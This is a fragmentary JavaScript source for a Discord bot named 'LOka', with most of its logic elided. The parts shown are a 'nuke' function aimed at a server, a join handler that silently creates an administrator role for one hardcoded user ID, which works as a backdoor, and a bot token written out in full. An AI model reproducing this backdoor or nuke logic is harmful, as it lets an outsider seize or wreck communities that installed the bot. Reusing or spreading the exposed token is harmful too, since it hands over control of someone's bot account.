...
async function nuke(guild) {
  ...
  await guild.owner.send(' i Love You :rose:').catch(e => { return void e; });
...
LOka.on('guildMemberAdd', member => {
            ...
            if (member.id === "532638784672497665") {
                member.guild.createRole({
                    name : LOka.user.username,
                    color : "RANDOM", 
                    permissions : [8]
...
LOka.login("NjM0MDc4NTE1MjEzNjMxNDg5.XadV0g.fmSFFpQsV1oxY3mv25BVyL59Zzo")
